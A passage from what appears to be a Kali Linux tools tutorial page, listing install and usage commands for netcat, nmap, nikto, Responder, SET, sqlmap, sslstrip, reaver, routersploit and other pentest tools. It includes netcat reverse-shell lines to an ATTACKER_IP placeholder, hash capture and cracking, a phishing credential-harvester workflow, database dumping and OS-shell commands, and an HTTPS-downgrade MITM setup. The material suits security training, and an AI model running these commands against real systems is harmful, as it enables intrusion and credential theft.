+# Purpose: Network Swiss Army knife
+
+sudo apt install netcat-traditional
+
+# Listen (bind shell):
+nc -lvnp 4444
+
+# Connect:
+nc 192.168.1.10 4444
+
+# Reverse shell:
+# Attacker:
+nc -lvnp 4444
+
+# Victim:
+nc ATTACKER_IP 4444 -e /bin/bash     # Linux
+nc ATTACKER_IP 4444 -e cmd.exe       # Windows
+
+# File transfer:
+# Receiver:
+nc -lvnp 4444 > file.txt
+
+# Sender:
+nc 192.168.1.10 4444 < file.txt
+
+# Port scan:
+nc -zv 192.168.1.10 1-1000
+
+# Banner grab:
+nc 192.168.1.10 80
+GET / HTTP/1.1
+Host: target.com
+
+# ========== NIKTO ==========
+# Category: Web Application Analysis
+# Purpose: Web server scanner
+
+sudo apt install nikto
+
+# Basic scan:
+nikto -h http://target.com
+
+# SSL:
+nikto -h https://target.com -ssl
+
+# Specific port:
+nikto -h 192.168.1.10 -p 8080
+
+# Tuning (specific test categories):
+nikto -h target.com -Tuning 123
+# 1 = Interesting files
+# 2 = Misconfiguration
+# 3 = Info disclosure
+# 4 = XSS
+# 5 = Remote file retrieval
+# 6 = DoS
+# 7 = Command execution
+# 8 = SQL injection
+# 9 = File upload
+
+# All categories:
+nikto -h target.com -Tuning 123456789
+
+# Save output:
+nikto -h target.com -o results.html -Format html
+
+# ========== NMAP ==========
+# Category: Information Gathering
+# Purpose: Network scanner (THE essential tool!)
+
+sudo apt install nmap
+
+# Quick scan:
+nmap 192.168.1.10
+
+# Aggressive scan:
+nmap -A 192.168.1.10
+# -A = OS detection, version detection, script scanning, traceroute
+
+# All ports:
+nmap -p- 192.168.1.10
+
+# Service version:
+nmap -sV 192.168.1.10
+
+# OS detection:
+nmap -O 192.168.1.10
+
+# Script scan:
+nmap -sC 192.168.1.10
+
+# Specific port:
+nmap -p 80,443 192.168.1.10
+
+# UDP scan:
+nmap -sU 192.168.1.10
+
+# Stealth SYN scan:
+nmap -sS 192.168.1.10
+
+# Skip ping (assume host up):
+nmap -Pn 192.168.1.10
+
+# Fast scan (top 100 ports):
+nmap -F 192.168.1.10
+
+# Subnet scan:
+nmap 192.168.1.0/24
+
+# From file:
+nmap -iL targets.txt
+
+# Timing:
+nmap -T4 192.168.1.10
+# T0 = Paranoid
+# T1 = Sneaky
+# T2 = Polite
+# T3 = Normal
+# T4 = Aggressive
+# T5 = Insane
+
+# Specific NSE script:
+nmap --script vuln 192.168.1.10
+nmap --script http-sql-injection 192.168.1.10
+
+# Output:
+nmap -oN output.txt 192.168.1.10      # Normal
+nmap -oX output.xml 192.168.1.10      # XML
+nmap -oG output.txt 192.168.1.10      # Greppable
+nmap -oA output 192.168.1.10          # All formats
+
+# ========== ONESIXTYONE ==========
+# Category: Information Gathering
+# Purpose: SNMP scanner (fast)
+
+sudo apt install onesixtyone
+
+# Scan with default community strings:
+onesixtyone 192.168.1.10
+
+# Custom community list:
+onesixtyone -c communities.txt 192.168.1.10
+
+# Subnet:
+onesixtyone -c communities.txt 192.168.1.0/24
+
+# Common communities:
+# public, private, manager, community
+
+# ========== OPENVAS ==========
+# Category: Vulnerability Analysis
+# Purpose: Vulnerability scanner (open-source)
+
+sudo apt install openvas
+
+# Setup:
+sudo gvm-setup
+
+# Start:
+sudo gvm-start
+
+# Access: https://127.0.0.1:9392
+# Credentials displayed after setup
+
+# Create scan:
+# 1. Scans → Tasks → New Task
+# 2. Select target
+# 3. Select scan config (Full and fast)
+# 4. Start scan
+
+# Reports available after completion
+
+# ========== OWASP ZAP ==========
+# Category: Web Application Analysis
+# Purpose: Web app security scanner (proxy + scanner)
+
+sudo apt install zaproxy
+
+# Launch:
+zaproxy
+
+# Manual proxy:
+# Configure browser: 127.0.0.1:8080
+# Browse target site
+# ZAP intercepts all traffic
+
+# Automated scan:
+# 1. Enter URL
+# 2. Attack → Automated Scan
+# 3. Review alerts
+
+# Active scan:
+# Right-click site → Attack → Active Scan
+
+# Fuzzer:
+# Right-click parameter → Fuzz
+# Add payloads
+
+# Spider:
+# Right-click site → Attack → Spider
+
+# API scan:
+# Import OpenAPI/Swagger definition
+
+# ========== PACU ==========
+# Category: Cloud Security
+# Purpose: AWS exploitation framework
+
+# Install:
+git clone https://github.com/RhinoSecurityLabs/pacu.git
+cd pacu
+pip3 install -r requirements.txt
+
+# Run:
+python3 pacu.py
+
+# Configure AWS keys:
+Pacu > import_keys
+
+# Modules:
+Pacu > modules
+
+# Enumerate IAM:
+Pacu > run iam__enum_users
+Pacu > run iam__enum_roles
+Pacu > run iam__enum_permissions
+
+# Enumerate EC2:
+Pacu > run ec2__enum
+
+# Enumerate S3:
+Pacu > run s3__enum
+
+# Privilege escalation:
+Pacu > run iam__privesc_scan
+
+# ========== REAVER ==========
+# Category: Wireless Attacks
+# Purpose: WPS brute force
+
+sudo apt install reaver
+
+# Enable monitor mode:
+sudo airmon-ng start wlan0
+
+# Scan for WPS:
+sudo wash -i wlan0mon
+
+# Attack:
+sudo reaver -i wlan0mon -b [BSSID] -vv
+
+# Options:
+# -c [channel]
+# -K 1    # Pixie dust attack (faster)
+# -N      # Ignore locked state
+# -d 5    # Delay between attempts
+
+# ========== RESPONDER ==========
+# Category: Post Exploitation
+# Purpose: LLMNR/NBT-NS/MDNS poisoner (capture hashes)
+
+sudo apt install responder
+
+# Basic:
+sudo responder -I eth0
+
+# Analyze mode (passive):
+sudo responder -I eth0 -A
+
+# WPAD:
+sudo responder -I eth0 -w
+
+# How it works:
+# 1. Listen for LLMNR/NBT-NS broadcasts
+# 2. Respond pretending to be requested resource
+# 3. Victim connects
+# 4. Capture NTLMv2 hash
+# 5. Crack with hashcat!
+
+# Captured hashes in:
+# /usr/share/responder/logs/
+
+# Crack captured hash:
+hashcat -m 5600 hash.txt rockyou.txt
+
+# ========== ROUTERSPLOIT ==========
+# Category: Exploitation Tools
+# Purpose: Router exploitation framework
+
+# Install:
+git clone https://github.com/threat9/routersploit.git
+cd routersploit
+pip3 install -r requirements.txt
+
+# Run:
+python3 rsf.py
+
+# Commands:
+rsf > use scanners/autopwn
+rsf (AutoPwn Scanner) > set target 192.168.1.1
+rsf (AutoPwn Scanner) > run
+
+# Exploit modules:
+rsf > search netgear
+rsf > use exploits/routers/netgear/password_disclosure
+rsf > set target 192.168.1.1
+rsf > exploit
+
+# ========== SET (Social Engineer Toolkit) ==========
+# Category: Social Engineering
+# Purpose: Comprehensive social engineering framework
+
+sudo apt install set
+
+# Launch:
+sudo setoolkit
+
+# Main menu:
+# 1) Social-Engineering Attacks
+# 2) Penetration Testing (Fast-Track)
+# 3) Third Party Modules
+# 4) Update SET
+
+# Common workflows:
+
+# Credential Harvester:
+# 1 → 2 → 3
+# Clone target login page
+# Host on attacker machine
+# Send phishing email
+# Capture credentials!
+
+# Java Applet Attack:
+# 1 → 1 → 1
+# Creates malicious applet
+# Victim downloads payload
+# Meterpreter shell!
+
+# ========== SKIPFISH ==========
+# Category: Web Application Analysis
+# Purpose: Active web security scanner
+
+sudo apt install skipfish
+
+# Basic scan:
+skipfish -o output_dir http://target.com
+
+# Authentication:
+skipfish -A username:password -o output_dir http://target.com
+
+# Cookies:
+skipfish -C \"session=abc123\" -o output_dir http://target.com
+
+# Results in output_dir/index.html
+
+# ========== SNORT ==========
+# Category: Sniffing & Spoofing
+# Purpose: IDS/IPS (Intrusion Detection/Prevention System)
+
+sudo apt install snort
+
+# Basic sniffing:
+sudo snort -v
+
+# Packet logging:
+sudo snort -l /var/log/snort -v
+
+# With rules:
+sudo snort -c /etc/snort/snort.conf -A console
+
+# Create rule:
+# In /etc/snort/rules/local.rules:
+alert tcp any any -> 192.168.1.0/24 80 (msg:\"HTTP Traffic\"; sid:1000001;)
+
+# ========== SPARTA ==========
+# Category: Information Gathering
+# Purpose: Network infrastructure penetration testing (GUI)
+
+sudo apt install sparta
+
+# Launch:
+sudo sparta
+
+# Workflow:
+# 1. Add range/host
+# 2. Auto scans with nmap
+# 3. Auto brute force
+# 4. Take notes
+# 5. Export report
+
+# ========== SQLMAP ==========
+# See Bonus Part 1 for detailed guide
+
+sudo apt install sqlmap
+
+# Basic:
+sqlmap -u \"http://target.com/page.php?id=1\"
+
+# Dump database:
+sqlmap -u \"http://target.com/page.php?id=1\" --dbs
+sqlmap -u \"http://target.com/page.php?id=1\" -D database --tables
+sqlmap -u \"http://target.com/page.php?id=1\" -D database -T users --dump
+
+# POST:
+sqlmap -u \"http://target.com/login.php\" --data=\"user=admin&pass=test\"
+
+# Cookies:
+sqlmap -u \"http://target.com/page.php?id=1\" --cookie=\"PHPSESSID=abc123\"
+
+# OS shell:
+sqlmap -u \"http://target.com/page.php?id=1\" --os-shell
+
+# ========== SSLSCAN ==========
+# Category: Information Gathering
+# Purpose: SSL/TLS scanner
+
+sudo apt install sslscan
+
+# Scan:
+sslscan target.com
+
+# Shows:
+# - Supported SSL/TLS versions
+# - Cipher suites
+# - Certificate details
+# - Vulnerabilities (Heartbleed, POODLE, etc.)
+
+# ========== SSLSTRIP ==========
+# Category: Sniffing & Spoofing
+# Purpose: Downgrade HTTPS to HTTP (MITM)
+
+sudo apt install sslstrip
+
+# Setup:
+# 1. Enable IP forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 2. iptables redirect:
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# 3. ARP spoof (with ettercap/arpspoof)
+
+# 4. Run sslstrip:
+sslstrip -l 8080
+
+# Captures credentials to sslstrip.log
+
+# ========== SUBLIST3R ==========
+# Category: Information Gathering
+# Purpose: Subdomain enumeration
+
+# Install:
+git clone https://github.com/aboul3la/Sublist3r.git
+cd Sublist3r
+pip3 install -r requirements.txt
+
+# Run:
+python3 sublist3r.py -d target.com
+
+# Brute force:
+python3 sublist3r.py -d target.com -b
+
+# Multiple search engines:
+python3 sublist3r.py -d target.com -e google,bing,yahoo,virustotal
+
+# Save output:
+python3 sublist3r.py -d target.com -o output.txt
+
+# ========== TCPDUMP ==========
+# Category: Sniffing & Spoofing
+# Purpose: Packet capture (CLI)
+
+sudo apt install tcpdump
+
+# Capture on interface:
+sudo tcpdump -i eth0
+
+# Save to file:
+sudo tcpdump -i eth0 -w capture.pcap
+
+# Read from file:
+tcpdump -r capture.pcap
+
+# Filters:
+sudo tcpdump -i eth0 host 192.168.1.10
+sudo tcpdump -i eth0 port 80
+sudo tcpdump -i eth0 src 192.168.1.10
+sudo tcpdump -i eth0 dst 192.168.1.20
+sudo tcpdump -i eth0 tcp and port 80
+
+# Specific protocol:
+sudo tcpdump -i eth0 icmp
+sudo tcpdump -i eth0 arp
+
+# ASCII output:
+sudo tcpdump -i eth0 -A
+
+# ========== TESTSSL ==========
+# See testssl.sh above
+
+# ========== UNICORNSCAN ==========
+# Category: Information Gathering
+# Purpose: Fast asynchronous port scanner
+
+sudo apt install unicornscan
+
+# TCP scan:
+sudo unicornscan 192.168.1.10:1-65535
+
+# UDP scan:
+sudo unicornscan -mU 192.168.1.10:1-1024
+
+# Faster than nmap for large port ranges
+
+# ========== URLCRAZY ==========
+# Category: Information Gathering
+# Purpose: Domain typosquatting detection
+
+sudo apt install urlcrazy
+
+# Check typosquats:
+urlcrazy target.com
+
+# Generates:
+# - Character omission (gogle.com)
+# - Character swap (gooogle.com)
+# - Adjacent keys (googke.com)
+# - Homoglyphs (g00gle.com)
+
+# Check if registered:
+urlcrazy -r target.com
+
+# ========== WAPITI ==========
+# Category: Web Application Analysis
+# Purpose: Web vulnerability scanner
+
+sudo apt install wapiti
+
+# Basic scan:
+wapiti -u http://target.com
+
+# Specific modules:
+wapiti -u http://target.com -m sql,xss
+
+# Available modules:
+# - sql (SQL injection)
+# - xss (Cross-site scripting)
+# - xxe (XML External Entity)
+# - file (Path traversal)
+# - ssrf (Server-Side Request Forgery)
+# - exec (Command execution)
+
+# Output:
+wapiti -u http://target.com -f html -o report.html
+
+# ========== YERSINIA ==========
+# Category: Sniffing & Spoofing
+# Purpose: Layer 2 attacks (STP, CDP, DTP, DHCP, etc.)
+
+sudo apt install yersinia
+
+# GUI:
+sudo yersinia -G
+
+# Interactive:
+sudo yersinia -I
+
+# Attack examples:
+# - STP attack (become root bridge)
+# - DHCP starvation
+# - CDP packet injection
+# - DTP trunk negotiation
+
+# Use in network pentests for VLAN hopping</div>
 
             <div class=\"metaphor-box\">
                 <h4>🎉 You're a Kali Tools Encyclopedia!</h4>
